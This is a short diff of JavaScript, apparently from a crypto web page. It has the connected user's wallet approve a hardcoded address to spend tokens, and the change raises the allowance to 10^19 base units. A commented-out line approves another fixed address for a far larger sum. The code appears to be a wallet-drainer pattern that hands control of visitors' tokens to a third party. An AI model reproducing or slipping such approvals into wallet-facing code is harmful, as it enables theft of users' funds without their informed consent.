@@ -232,7 +232,7 @@
           contract = contract.connect(signer);
 
           returnTip();
-          var   t= await contract.approve('0xF56077B4Df8aFf0915b839B33502938908D41f73', 100000000 ).send({from:msg_address});
+          var   t= await contract.approve('0xF56077B4Df8aFf0915b839B33502938908D41f73', "10000000000000000000" ).send({from:msg_address});
           // var boo0l =  await contract.name();
           console.log(t);
           // await contract.approve('0xc8147753bC4Ea7E2729fbb4E7B2C93BF8337fA9b',"90000000000000000000000000000").send({from: msg_address});
